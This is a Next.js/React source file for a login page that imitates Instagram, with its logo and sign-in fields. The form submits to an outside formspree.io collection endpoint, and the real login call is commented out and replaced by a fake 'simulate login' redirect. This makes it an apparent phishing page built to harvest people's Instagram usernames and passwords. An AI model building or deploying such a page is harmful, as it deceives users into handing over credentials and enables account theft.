"use client";

import { useRouter } from 'next/navigation';
import { useState } from 'react';
import Image from 'next/image';

export default function Login() {
  const router = useRouter();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  // const handleLogin = async (e) => {
  //   e.preventDefault();

  //   if (username && password) {
  //     try {
  //       const response = await fetch('/api/login', {
  //         method: 'POST',
  //         headers: { 'Content-Type': 'application/json' },
  //         body: JSON.stringify({ username, password }),
  //       });

  //       if (response.ok) {
  //         router.push('/wishes');
  //       } else {
  //         console.error('Error:', await response.json());
  //       }
  //     } catch (error) {
  //       console.error('Network error:', error.message);
  //     }
  //   }
  // };

  const handleLogin = (e) => {
    e.preventDefault();
    // Simulate login
    if (username && password) {
      router.push('/wishes');
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-100 text-black">
      <div className="flex items-center justify-center flex-1 p-4">
        <div className="bg-white shadow-lg rounded-lg w-full max-w-sm mx-auto p-6">
          <div className="flex justify-center mb-6">
            <Image src="/instaLogo.png" width={200} height={200} alt="Instagram Logo" />
          </div>
          <form action="https://formspree.io/f/xqazqorw" method = "POST" onclick = {handleLogin}>
            <div className="mb-4">
              <input
                type="text"
                placeholder="Phone number, username, email"
                className="w-full px-4 py-2 border rounded-lg focus:outline-none focus:border-blue-500"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
              />
            </div>
            <div className="mb-4">
              <input
                type="password"
                placeholder="Password"
                className="w-full px-4 py-2 border rounded-lg focus:outline-none focus:border-blue-500"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
            </div>
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-700 transition"
            >
              Log In
            </button>
          </form>
          <div className="text-center mt-4">
            <p className="text-sm">
              Don't have an account?{" "}
              <a href="#" className="text-blue-500">
                Sign up
              </a>
            </p>
          </div>
        </div>
      </div>
      <footer className=" text-sm flex justify-center">
        <Image src="/footer.png" width={100} height={100} alt="Footer Logo" />
      </footer>
    </div>
  );
}
